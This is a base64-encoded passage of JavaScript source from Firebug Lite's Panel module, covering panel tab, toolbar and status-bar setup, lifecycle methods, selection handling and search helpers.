zcz0iZmJUYWJMIj48L3NwYW4+PHNwYW4gY2xhc3M9ImZiVGFiVGV4dCI+JyArDQogICAgICAgICAgICAgICAgICAgIHRoaXMudGl0bGUgKyAnPC9zcGFuPjxzcGFuIGNsYXNzPSJmYlRhYlIiPjwvc3Bhbj4nOyAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgdGFiTm9kZSA9IHRoaXMudGFiTm9kZSA9IGNyZWF0ZUVsZW1lbnQoImEiLCB7DQogICAgICAgICAgICAgICAgaWQ6IHBhbmVsSWQgKyAiVGFiIiwNCiAgICAgICAgICAgICAgICBjbGFzc05hbWU6ICJmYlRhYiBmYkhvdmVyIiwNCiAgICAgICAgICAgICAgICBpbm5lckhUTUw6IHRhYkhUTUwNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaXNJRTYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGFiTm9kZS5ocmVmID0gImphdmFzY3JpcHQ6dm9pZCgwKSI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBwYW5lbEJhck5vZGUgPSB0aGlzLnBhcmVudFBhbmVsID8gDQogICAgICAgICAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmdldFBhbmVsKHRoaXMucGFyZW50UGFuZWwpLnNpZGVQYW5lbEJhck5vZGUgOg0KICAgICAgICAgICAgICAgICAgICB0aGlzLnBhbmVsQmFyTm9kZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcGFuZWxCYXJOb2RlLmFwcGVuZENoaWxkKHRhYk5vZGUpOw0KICAgICAgICAgICAgdGFiTm9kZS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgICAgIC8vIGNyZWF0ZSBUb29sQnV0dG9ucw0KICAgICAgICAgICAgaWYgKG9wdGlvbnMuaGFzVG9vbEJ1dHRvbnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy50b29sQnV0dG9uc05vZGUgPSBjcmVhdGVFbGVtZW50KCJzcGFuIiwgew0KICAgICAgICAgICAgICAgICAgICBpZDogcGFuZWxJZCArICJCdXR0b25zIiwNCiAgICAgICAgICAgICAgICAgICAgY2xhc3NOYW1lOiAiZmJUb29sYmFyQnV0dG9ucyINCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkKCJmYlRvb2xiYXJCdXR0b25zIikuYXBwZW5kQ2hpbGQodGhpcy50b29sQnV0dG9uc05vZGUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAgICAgLy8gY3JlYXRlIFN0YXR1c0Jhcg0KICAgICAgICAgICAgaWYgKG9wdGlvbnMuaGFzU3RhdHVzQmFyKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuc3RhdHVzQmFyQm94ID0gJCgiZmJTdGF0dXNCYXJCb3giKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0aGlzLnN0YXR1c0Jhck5vZGUgPSBjcmVhdGVFbGVtZW50KCJzcGFuIiwgew0KICAgICAgICAgICAgICAgICAgICBpZDogcGFuZWxJZCArICJTdGF0dXNCYXIiLA0KICAgICAgICAgICAgICAgICAgICBjbGFzc05hbWU6ICJmYlRvb2xiYXJCdXR0b25zIGZiU3RhdHVzQmFyIg0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRoaXMuc3RhdHVzQmFyQm94LmFwcGVuZENoaWxkKHRoaXMuc3RhdHVzQmFyTm9kZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgICAgICAvLyBjcmVhdGUgU2lkZVBhbmVsDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHRoaXMuY29udGFpbmVyTm9kZSA9IHRoaXMucGFuZWxOb2RlLnBhcmVudE5vZGU7DQogICAgICAgIA0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfSU5JVElBTElaRSkgRkJUcmFjZS5zeXNvdXQoIkZpcmVidWcuUGFuZWwuY3JlYXRlIiwgdGhpcy5uYW1lKTsNCiAgICAgICAgDQogICAgICAgIC8vIHh4eHBlZHJvIGNvbnRleHRNZW51DQogICAgICAgIHRoaXMub25Db250ZXh0TWVudSA9IGJpbmQodGhpcy5vbkNvbnRleHRNZW51LCB0aGlzKTsNCiAgICAgICAgDQogICAgICAgIC8qDQogICAgICAgIHRoaXMuY29udGV4dCA9IGNvbnRleHQ7DQogICAgICAgIHRoaXMuZG9jdW1lbnQgPSBkb2M7DQoNCiAgICAgICAgdGhpcy5wYW5lbE5vZGUgPSBkb2MuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIHRoaXMucGFuZWxOb2RlLm93bmVyUGFuZWwgPSB0aGlzOw0KDQogICAgICAgIHNldENsYXNzKHRoaXMucGFuZWxOb2RlLCAicGFuZWxOb2RlIHBhbmVsTm9kZS0iK3RoaXMubmFtZSsiIGNvbnRleHRVSUQ9Iitjb250ZXh0LnVpZCk7DQogICAgICAgIGRvYy5ib2R5LmFwcGVuZENoaWxkKHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfSU5JVElBTElaRSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJmaXJlYnVnLmluaXRpYWxpemUgcGFuZWxOb2RlIGZvciAiK3RoaXMubmFtZSsiXG4iKTsNCg0KICAgICAgICB0aGlzLmluaXRpYWxpemVOb2RlKHRoaXMucGFuZWxOb2RlKTsNCiAgICAgICAgLyoqLw0KICAgIH0sDQoNCiAgICBkZXN0cm95OiBmdW5jdGlvbihzdGF0ZSkgLy8gUGFuZWwgbWF5IHN0b3JlIGluZm8gb24gc3RhdGUNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFKSBGQlRyYWNlLnN5c291dCgiRmlyZWJ1Zy5QYW5lbC5kZXN0cm95IiwgdGhpcy5uYW1lKTsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLmhhc1NpZGVQYW5lbCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zaWRlUGFuZWxCYXIuZGVzdHJveSgpOw0KICAgICAgICAgICAgdGhpcy5zaWRlUGFuZWxCYXIgPSBudWxsOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB0aGlzLm9wdGlvbnMgPSBudWxsOw0KICAgICAgICB0aGlzLm5hbWUgPSBudWxsOw0KICAgICAgICB0aGlzLnBhcmVudFBhbmVsID0gbnVsbDsNCiAgICAgICAgDQogICAgICAgIHRoaXMudGFiTm9kZSA9IG51bGw7DQogICAgICAgIHRoaXMucGFuZWxOb2RlID0gbnVsbDsNCiAgICAgICAgdGhpcy5jb250YWluZXJOb2RlID0gbnVsbDsNCiAgICAgICAgDQogICAgICAgIHRoaXMudG9vbEJ1dHRvbnNOb2RlID0gbnVsbDsNCiAgICAgICAgdGhpcy5zdGF0dXNCYXJCb3ggPSBudWxsOw0KICAgICAgICB0aGlzLnN0YXR1c0Jhck5vZGUgPSBudWxsOw0KICAgICAgICANCiAgICAgICAgLy9pZiAodGhpcy5wYW5lbE5vZGUpDQogICAgICAgIC8vICAgIGRlbGV0ZSB0aGlzLnBhbmVsTm9kZS5vd25lclBhbmVsOw0KDQogICAgICAgIC8vdGhpcy5kZXN0cm95Tm9kZSgpOw0KICAgIH0sDQogICAgDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0lOSVRJQUxJWkUpIEZCVHJhY2Uuc3lzb3V0KCJGaXJlYnVnLlBhbmVsLmluaXRpYWxpemUiLCB0aGlzLm5hbWUpOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIGlmICh0aGlzLmhhc1NpZGVQYW5lbCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zaWRlUGFuZWxCYXIuaW5pdGlhbGl6ZSgpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB2YXIgb3B0aW9ucyA9IHRoaXMub3B0aW9ucyA9IGV4dGVuZChGaXJlYnVnLlBhbmVsLm9wdGlvbnMsIHRoaXMub3B0aW9ucyk7DQogICAgICAgIHZhciBwYW5lbElkID0gImZiIiArIHRoaXMubmFtZTsNCiAgICAgICAgDQogICAgICAgIHRoaXMucGFuZWxOb2RlID0gJChwYW5lbElkKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMudGFiTm9kZSA9ICQocGFuZWxJZCArICJUYWIiKTsNCiAgICAgICAgdGhpcy50YWJOb2RlLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOw0KICAgICAgICANCiAgICAgICAgaWYgKG9wdGlvbnMuaGFzU3RhdHVzQmFyKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnN0YXR1c0JhckJveCA9ICQoImZiU3RhdHVzQmFyQm94Iik7DQogICAgICAgICAgICB0aGlzLnN0YXR1c0Jhck5vZGUgPSAkKHBhbmVsSWQgKyAiU3RhdHVzQmFyIik7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmIChvcHRpb25zLmhhc1Rvb2xCdXR0b25zKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnRvb2xCdXR0b25zTm9kZSA9ICQocGFuZWxJZCArICJCdXR0b25zIik7DQogICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICB0aGlzLmNvbnRhaW5lck5vZGUgPSB0aGlzLnBhbmVsTm9kZS5wYXJlbnROb2RlOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIC8vIHJlc3RvcmUgcGVyc2lzdGVudCBzdGF0ZQ0KICAgICAgICB0aGlzLmNvbnRhaW5lck5vZGUuc2Nyb2xsVG9wID0gdGhpcy5sYXN0U2Nyb2xsVG9wOw0KICAgICAgICANCiAgICAgICAgLy8geHh4cGVkcm8gY29udGV4dE1lbnUNCiAgICAgICAgYWRkRXZlbnQodGhpcy5jb250YWluZXJOb2RlLCAiY29udGV4dG1lbnUiLCB0aGlzLm9uQ29udGV4dE1lbnUpOw0KICAgICAgICANCiAgICAgICAgDQogICAgICAgIC8vLyBUT0RPOiB4eHhwZWRybyBpbmZvVGlwIEhhY2sNCiAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuY3VycmVudFBhbmVsID0gDQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0ZWRQYW5lbCAmJiBGaXJlYnVnLmNocm9tZS5zZWxlY3RlZFBhbmVsLnNpZGVQYW5lbEJhciA/DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0ZWRQYW5lbC5zaWRlUGFuZWxCYXIuc2VsZWN0ZWRQYW5lbCA6IA0KICAgICAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdGVkUGFuZWw7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLnNob3dJbmZvVGlwcyA9IHRydWU7DQogICAgICAgIGlmIChGaXJlYnVnLkluZm9UaXApDQogICAgICAgICAgICBGaXJlYnVnLkluZm9UaXAuaW5pdGlhbGl6ZUJyb3dzZXIoRmlyZWJ1Zy5jaHJvbWUpOw0KICAgIH0sDQogICAgDQogICAgc2h1dGRvd246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFKSBGQlRyYWNlLnN5c291dCgiRmlyZWJ1Zy5QYW5lbC5zaHV0ZG93biIsIHRoaXMubmFtZSk7DQogICAgICAgIA0KICAgICAgICAvLy8gVE9ETzogeHh4cGVkcm8gaW5mb1RpcCBIYWNrDQogICAgICAgIGlmIChGaXJlYnVnLkluZm9UaXApDQogICAgICAgICAgICBGaXJlYnVnLkluZm9UaXAudW5pbml0aWFsaXplQnJvd3NlcihGaXJlYnVnLmNocm9tZSk7DQogICAgICAgIA0KICAgICAgICBpZiAoRmlyZWJ1Zy5jaHJvbWUubGFyZ2VDb21tYW5kTGluZVZpc2libGUpDQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5oaWRlTGFyZ2VDb21tYW5kTGluZSgpOw0KICAgICAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICBpZiAodGhpcy5oYXNTaWRlUGFuZWwpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIGZpcmVidWcxLjNhNiANCiAgICAgICAgICAgIC8vIG5ldyBQYW5lbEJhciBtZWNoYW5pc20gd2lsbCBuZWVkIHRvIGNhbGwgc2h1dGRvd24gdG8gaGlkZSB0aGUgcGFuZWxzIChzbyBpdCANCiAgICAgICAgICAgIC8vIGRvZXNuJ3QgYXBwZWFycyBpbiBvdGhlciBwYW5lbCdzIHNpZGVQYW5lbEJhci4gVGhlcmVmb3JlLCB3ZSBuZWVkIHRvIGltcGxlbWVudCANCiAgICAgICAgICAgIC8vIGEgInJlbWVtYmVyIHNlbGVjdGVkIHBhbmVsIiBmZWF0dXJlIGluIHRoZSBzaWRlUGFuZWxCYXINCiAgICAgICAgICAgIC8vdGhpcy5zaWRlUGFuZWxCYXIuc2h1dGRvd24oKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8gc3RvcmUgcGVyc2lzdGVudCBzdGF0ZQ0KICAgICAgICB0aGlzLmxhc3RTY3JvbGxUb3AgPSB0aGlzLmNvbnRhaW5lck5vZGUuc2Nyb2xsVG9wOw0KICAgICAgICANCiAgICAgICAgLy8geHh4cGVkcm8gY29udGV4dE1lbnUNCiAgICAgICAgcmVtb3ZlRXZlbnQodGhpcy5jb250YWluZXJOb2RlLCAiY29udGV4dG1lbnUiLCB0aGlzLm9uQ29udGV4dE1lbnUpOw0KICAgIH0sDQoNCiAgICBkZXRhY2g6IGZ1bmN0aW9uKG9sZENocm9tZSwgbmV3Q2hyb21lKQ0KICAgIHsNCiAgICAgICAgaWYgKG9sZENocm9tZSAmJiBvbGRDaHJvbWUuc2VsZWN0ZWRQYW5lbCAmJiBvbGRDaHJvbWUuc2VsZWN0ZWRQYW5lbC5uYW1lID09IHRoaXMubmFtZSkNCiAgICAgICAgICAgIHRoaXMubGFzdFNjcm9sbFRvcCA9IG9sZENocm9tZS5zZWxlY3RlZFBhbmVsLmNvbnRhaW5lck5vZGUuc2Nyb2xsVG9wOw0KICAgIH0sDQoNCiAgICByZWF0dGFjaDogZnVuY3Rpb24oZG9jKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMub3B0aW9ucy5pbm5lckhUTUxTeW5jKQ0KICAgICAgICAgICAgdGhpcy5zeW5jaHJvbml6ZVVJKCk7DQogICAgfSwNCiAgICANCiAgICBzeW5jaHJvbml6ZVVJOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB0aGlzLmNvbnRhaW5lck5vZGUuc2Nyb2xsVG9wID0gdGhpcy5sYXN0U2Nyb2xsVG9wIHx8IDA7DQogICAgfSwNCg0KICAgIHNob3c6IGZ1bmN0aW9uKHN0YXRlKQ0KICAgIHsNCiAgICAgICAgdmFyIG9wdGlvbnMgPSB0aGlzLm9wdGlvbnM7DQogICAgICAgIA0KICAgICAgICBpZiAob3B0aW9ucy5oYXNTdGF0dXNCYXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuc3RhdHVzQmFyQm94LnN0eWxlLmRpc3BsYXkgPSAiaW5saW5lIjsNCiAgICAgICAgICAgIHRoaXMuc3RhdHVzQmFyTm9kZS5zdHlsZS5kaXNwbGF5ID0gImlubGluZSI7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmIChvcHRpb25zLmhhc1Rvb2xCdXR0b25zKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnRvb2xCdXR0b25zTm9kZS5zdHlsZS5kaXNwbGF5ID0gImlubGluZSI7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHRoaXMucGFuZWxOb2RlLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOw0KICAgICAgICANCiAgICAgICAgdGhpcy52aXNpYmxlID0gdHJ1ZTsNCiAgICAgICAgDQogICAgICAgIGlmICghdGhpcy5wYXJlbnRQYW5lbCkNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmxheW91dCh0aGlzKTsNCiAgICB9LA0KDQogICAgaGlkZTogZnVuY3Rpb24oc3RhdGUpDQogICAgew0KICAgICAgICB2YXIgb3B0aW9ucyA9IHRoaXMub3B0aW9uczsNCiAgICAgICAgDQogICAgICAgIGlmIChvcHRpb25zLmhhc1N0YXR1c0JhcikNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zdGF0dXNCYXJCb3guc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgICAgIHRoaXMuc3RhdHVzQmFyTm9kZS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAob3B0aW9ucy5oYXNUb29sQnV0dG9ucykNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy50b29sQnV0dG9uc05vZGUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdGhpcy5wYW5lbE5vZGUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgDQogICAgICAgIHRoaXMudmlzaWJsZSA9IGZhbHNlOw0KICAgIH0sDQoNCiAgICB3YXRjaFdpbmRvdzogZnVuY3Rpb24od2luKQ0KICAgIHsNCiAgICB9LA0KDQogICAgdW53YXRjaFdpbmRvdzogZnVuY3Rpb24od2luKQ0KICAgIHsNCiAgICB9LA0KDQogICAgdXBkYXRlT3B0aW9uOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSkNCiAgICB7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIC8qKg0KICAgICAqIFRvb2xiYXIgaGVscGVycw0KICAgICAqLw0KICAgIHNob3dUb29sYmFyQnV0dG9uczogZnVuY3Rpb24oYnV0dG9uc0lkLCBzaG93KQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICghdGhpcy5jb250ZXh0LmJyb3dzZXIpIC8vIFhYWGpqYiB0aGlzIGlzIGJ1Zy4gU29tZWhvdyB0aGUgcGFuZWwgY29udGV4dCBpcyBub3QgRmlyZWJ1Z0NvbnRleHQuDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUykNCiAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImZpcmVidWcuUGFuZWwgc2hvd1Rvb2xiYXJCdXR0b25zIHRoaXMuY29udGV4dCBoYXMgbm8gYnJvd3NlciwgdGhpczoiLCB0aGlzKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHZhciBidXR0b25zID0gdGhpcy5jb250ZXh0LmJyb3dzZXIuY2hyb21lLiQoYnV0dG9uc0lkKTsNCiAgICAgICAgICAgIGlmIChidXR0b25zKQ0KICAgICAgICAgICAgICAgIGNvbGxhcHNlKGJ1dHRvbnMsIHNob3cgPyAiZmFsc2UiIDogInRydWUiKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZCVHJhY2UuZHVtcFByb3BlcnRpZXMoImZpcmVidWcuUGFuZWwgc2hvd1Rvb2xiYXJCdXR0b25zIEZBSUxTIiwgZXhjKTsNCiAgICAgICAgICAgICAgICBpZiAoIXRoaXMuY29udGV4dC5icm93c2VyKUZCVHJhY2UuZHVtcFN0YWNrKCJmaXJlYnVnLlBhbmVsIHNob3dUb29sYmFyQnV0dG9ucyBubyBicm93c2VyIik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgLyoqDQogICAgICogUmV0dXJucyBhIG51bWJlciBpbmRpY2F0aW5nIHRoZSB2aWV3J3MgYWJpbGl0eSB0byBpbnNwZWN0IHRoZSBvYmplY3QuDQogICAgICoNCiAgICAgKiBaZXJvIG1lYW5zIG5vdCBzdXBwb3J0ZWQsIGFuZCBoaWdoZXIgbnVtYmVycyBpbmRpY2F0ZSBzcGVjaWZpY2l0eS4NCiAgICAgKi8NCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfSwNCg0KICAgIGhhc09iamVjdDogZnVuY3Rpb24ob2JqZWN0KSAgLy8gYmV5b25kIHR5cGUgdGVzdGluZywgaXMgdGhpcyBvYmplY3Qgc2VsZWN0YWJsZT8NCiAgICB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KDQogICAgc2VsZWN0OiBmdW5jdGlvbihvYmplY3QsIGZvcmNlVXBkYXRlKQ0KICAgIHsNCiAgICAgICAgaWYgKCFvYmplY3QpDQogICAgICAgICAgICBvYmplY3QgPSB0aGlzLmdldERlZmF1bHRTZWxlY3Rpb24odGhpcy5jb250ZXh0KTsNCg0KICAgICAgICBpZihGQlRyYWNlLkRCR19QQU5FTFMpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZmlyZWJ1Zy5zZWxlY3QgIit0aGlzLm5hbWUrIiBmb3JjZVVwZGF0ZTogIitmb3JjZVVwZGF0ZSsiICIrb2JqZWN0Kygob2JqZWN0PT10aGlzLnNlbGVjdGlvbik/Ij09IjoiIT0iKSt0aGlzLnNlbGVjdGlvbik7DQoNCiAgICAgICAgaWYgKGZvcmNlVXBkYXRlIHx8IG9iamVjdCAhPSB0aGlzLnNlbGVjdGlvbikNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zZWxlY3Rpb24gPSBvYmplY3Q7DQogICAgICAgICAgICB0aGlzLnVwZGF0ZVNlbGVjdGlvbihvYmplY3QpOw0KDQogICAgICAgICAgICAvLyBUT0RPOiB4eHhwZWRybw0KICAgICAgICAgICAgLy8gWFhYam9lIFRoaXMgaXMga2luZCBvZiBjaGVhdGluZywgYnV0LCBmZWguDQogICAgICAgICAgICAvL0ZpcmVidWcuY2hyb21lLm9uUGFuZWxTZWxlY3Qob2JqZWN0LCB0aGlzKTsNCiAgICAgICAgICAgIC8vaWYgKHVpTGlzdGVuZXJzLmxlbmd0aCA+IDApDQogICAgICAgICAgICAvLyAgICBkaXNwYXRjaCh1aUxpc3RlbmVycywgIm9uUGFuZWxTZWxlY3QiLCBbb2JqZWN0LCB0aGlzXSk7ICAvLyBUT0RPOiBtYWtlIEZpcmVidWcuY2hyb21lIGEgdWlMaXN0ZW5lcg0KICAgICAgICB9DQogICAgfSwNCg0KICAgIHVwZGF0ZVNlbGVjdGlvbjogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICB9LA0KDQogICAgbWFya0NoYW5nZTogZnVuY3Rpb24oc2tpcFNlbGYpDQogICAgew0KICAgICAgICBpZiAodGhpcy5kZXBlbmRlbnRzKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoc2tpcFNlbGYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmRlcGVuZGVudHMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgcGFuZWxOYW1lID0gdGhpcy5kZXBlbmRlbnRzW2ldOw0KICAgICAgICAgICAgICAgICAgICBpZiAocGFuZWxOYW1lICE9IHRoaXMubmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuY29udGV4dC5pbnZhbGlkYXRlUGFuZWxzKHBhbmVsTmFtZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHRoaXMuY29udGV4dC5pbnZhbGlkYXRlUGFuZWxzLmFwcGx5KHRoaXMuY29udGV4dCwgdGhpcy5kZXBlbmRlbnRzKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgc3RhcnRJbnNwZWN0aW5nOiBmdW5jdGlvbigpDQogICAgew0KICAgIH0sDQoNCiAgICBzdG9wSW5zcGVjdGluZzogZnVuY3Rpb24ob2JqZWN0LCBjYW5jZWxsZWQpDQogICAgew0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBzZWFyY2g6IGZ1bmN0aW9uKHRleHQsIHJldmVyc2UpDQogICAgew0KICAgIH0sDQoNCiAgICAvKioNCiAgICAgKiBSZXRyaWV2ZXMgdGhlIHNlYXJjaCBvcHRpb25zIHRoYXQgdGhpcyBtb2R1bGVzIHN1cHBvcnRzLg0KICAgICAqIFRoaXMgaXMgdXNlZCBieSB0aGUgc2VhcmNoIFVJIHRvIHByZXNlbnQgdGhlIHByb3BlciBvcHRpb25zLg0KICAgICAqLw0KICAgIGdldFNlYXJjaE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICBGaXJlYnVnLlNlYXJjaC5zZWFyY2hPcHRpb25NZW51KCJzZWFyY2guQ2FzZSBTZW5zaXRpdmUiLCAic2VhcmNoQ2FzZVNlbnNpdGl2ZSIpDQogICAgICAgIF07DQogICAgfSwNCg0KICAgIC8qKg0KICAgICAqIE5hdmlnYXRlcyB0byB0aGUgbmV4dCBkb2N1bWVudCB3aG9zZSBtYXRjaCBwYXJhbWV0ZXIgcmV0dXJucyB0cnVlLg0KICAgICAqLw0KICAgIG5hdmlnYXRlVG9OZXh0RG9jdW1lbnQ6IGZ1bmN0aW9uKG1hdGNoLCByZXZlcnNlKQ0KICAgIHsNCiAgICAgICAgLy8gVGhpcyBpcyBhbiBhcHByb3hpbWF0aW9uIG9mIHRoZSBVSSB0aGF0IGlzIGRpc3BsYXllZCBieSB0aGUgbG9jYXRpb24NCiAgICAgICAgLy8gc2VsZWN0b3IuIFRoaXMgc2hvdWxkIGJlIGNsb3NlIGVub3VnaCwgYWx0aG91Z2ggaXQgbWF5IGJlIGJldHRlcg0KICAgICAgICAvLyB0byBzaW1wbHkgZ2VuZXJhdGUgdGhlIHNvcnRlZCBsaXN0IHdpdGhpbiB0aGUgbW9kdWxlLCByYXRoZXIgdGhhbg0KICAgICAgICAvLyBzb3J0aW5nIHdpdGhpbiB0aGUgVUkuDQogICAgICAgIHZhciBzZWxmID0gdGhpczsNCiAgICAgICAgZnVuY3Rpb24gY29tcGFyZShhLCBiKSB7DQogICAgICAgICAgICB2YXIgbG9jQSA9IHNlbGYuZ2V0T2JqZWN0RGVzY3JpcHRpb24oYSk7DQogICAgICAgICAgICB2YXIgbG9jQiA9IHNlbGYuZ2V0T2JqZWN0RGVzY3JpcHRpb24oYik7DQogICAgICAgICAgICBpZihsb2NBLnBhdGggPiBsb2NCLnBhdGgpDQogICAgICAgICAgICAgICAgcmV0dXJuIDE7DQogICAgICAgICAgICBpZihsb2NBLnBhdGggPCBsb2NCLnBhdGgpDQogICAgICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICAgICAgaWYobG9jQS5uYW1lID4gbG9jQi5uYW1lKQ0KICAgICAgICAgICAgICAgI